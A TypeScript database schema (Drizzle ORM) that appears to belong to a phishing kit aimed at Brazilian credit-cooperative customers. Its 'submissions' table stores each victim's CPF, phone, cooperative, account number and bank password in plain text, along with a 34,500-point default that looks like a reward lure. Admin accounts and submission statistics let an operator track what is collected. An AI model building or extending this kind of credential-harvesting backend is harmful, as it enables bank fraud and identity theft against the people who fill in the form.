import { pgTable, text, serial, timestamp, integer, boolean } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

// User model for authentication
export const users = pgTable("users", {
  id: serial("id").primaryKey(),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
  isAdmin: boolean("is_admin").default(false).notNull(),
});

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
  isAdmin: true,
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;

// Submission model for form data
export const submissions = pgTable("submissions", {
  id: serial("id").primaryKey(),
  cpf: text("cpf").notNull(),
  phone: text("phone"),
  cooperativa: text("cooperativa"),
  account: text("account"),
  password: text("password"),
  status: text("status").default("pending").notNull(),
  createdAt: timestamp("created_at").defaultNow().notNull(),
  points: integer("points").default(34500),
});

export const insertSubmissionSchema = createInsertSchema(submissions)
  .omit({ 
    id: true, 
    createdAt: true 
  });

export type InsertSubmission = z.infer<typeof insertSubmissionSchema>;
export type Submission = typeof submissions.$inferSelect;

// Input validation schemas
export const cpfSchema = z.object({
  cpf: z.string().regex(/^\d{3}\.\d{3}\.\d{3}-\d{2}$/, "CPF inválido")
});

export const phoneSchema = z.object({
  phone: z.string().regex(/^\(\d{2}\)\s\d{5}-\d{4}$/, "Telefone inválido")
});

export const accountSchema = z.object({
  cooperativa: z.string().min(3, "Cooperativa deve ter pelo menos 3 caracteres"),
  account: z.string().min(3, "Conta deve ter pelo menos 3 caracteres")
});

export const passwordSchema = z.object({
  password: z.string().min(4, "Senha deve ter pelo menos 4 caracteres")
});

// System stats model
export const systemStats = pgTable("system_stats", {
  id: serial("id").primaryKey(),
  totalSubmissions: integer("total_submissions").default(0),
  completedSubmissions: integer("completed_submissions").default(0),
  pendingSubmissions: integer("pending_submissions").default(0),
  failedSubmissions: integer("failed_submissions").default(0),
  totalPoints: integer("total_points").default(0),
  lastUpdated: timestamp("last_updated").defaultNow()
});
